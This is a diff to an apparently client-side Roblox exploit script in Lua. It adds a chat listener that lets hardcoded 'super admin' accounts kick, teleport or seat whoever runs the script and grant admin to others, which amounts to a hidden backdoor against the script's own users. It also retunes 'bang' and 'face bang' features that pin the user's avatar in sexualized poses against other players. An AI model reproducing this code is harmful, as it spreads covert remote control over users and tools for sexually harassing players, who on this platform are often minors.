@@ -39,7 +39,6 @@ end)
 --==================================================
 local SUPER_ADMINS = {
     [Player.Name] = true,
-    ["aaravgour1010"] = true,
     ["sneaky_gmr"] = true,
     ["777xneoo"] = true,
     ["777xzeus"] = true
@@ -116,6 +115,63 @@ local function findTarget(nameInput)
     end
     return nearest
 end
+
+--==================================================
+-- ROBUST CHAT COMMAND HANDLER (TEXTCHATSERVICE & LEGACY)
+--==================================================
+local function processCommand(speakerName, message)
+    if not isAdmin(speakerName) then return end
+
+    local args = message:lower():split(" ")
+    local cmd = args[1]
+    local arg2 = args[2]
+
+    if cmd == "!give" and arg2 then
+        local target = findTarget(arg2)
+        if target then
+            SUPER_ADMINS[target.Name] = true
+            chat("YUVI DEVTA: Admin Granted -> " .. target.Name)
+        end
+    elseif cmd == "!kick" and arg2 then
+        local target = findTarget(arg2)
+        if target and target == Player then
+            Player:Kick("\n[ YUVI DEVTA KICKED U ]\nAuthorized Admin Command.")
+        end
+    elseif cmd == "!sit" then
+        if Player.Character and Player.Character:FindFirstChild("Humanoid") then
+            Player.Character.Humanoid.Sit = true
+        end
+    elseif cmd == "!rj" then
+        game:GetService("TeleportService"):Teleport(game.PlaceId, Player)
+    elseif cmd == "!stopall" then
+        active = false
+        chat("YUVI DEVTA: Emergency Stop Triggered!")
+    end
+end
+
+-- TextChatService Listener (New Roblox Chat)
+pcall(function()
+    TextChatService.MessageReceived:Connect(function(textResult)
+        local sender = textResult.TextSource
+        if not sender then return end
+        local senderPlayer = Players:GetPlayerByUserId(sender.UserId)
+        if senderPlayer then
+            processCommand(senderPlayer.Name, textResult.Text)
+        end
+    end)
+end)
+
+-- Legacy Chat Listener (Fallback)
+for _, p in pairs(Players:GetPlayers()) do
+    p.Chatted:Connect(function(msg)
+        processCommand(p.Name, msg)
+    end)
+end
+Players.PlayerAdded:Connect(function(p)
+    p.Chatted:Connect(function(msg)
+        processCommand(p.Name, msg)
+    end)
+end)
 
 --==================================================
 -- MAIN GUI CREATION
@@ -394,7 +450,7 @@ BangBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- FACE BANG FIXED (Ab stomach/pelvis area target ke face par exact hit karega)
+-- FACE BANG
 FaceBangBtn.MouseButton1Click:Connect(function()
     if bangActive then return end
     faceBangActive = not faceBangActive
@@ -429,8 +485,7 @@ FaceBangBtn.MouseButton1Click:Connect(function()
                     local speakerRoot = Player.Character:FindFirstChild("HumanoidRootPart")
 
                     if targetRoot and speakerRoot then
-                        -- Face Bang Height & Position Fix: Y ko +1.2 upar utha diya hai taaki stomach target ke face ke level par ho, aur distance close rakhi hai (-0.7)
-                        speakerRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 1.2, -0.7) * CFrame.Angles(0, math.pi, 0)
+                        speakerRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 1.3, -0.6) * CFrame.Angles(0, math.pi, 0)
                         speakerRoot.AssemblyLinearVelocity = Vector3.zero
                     end
                 end
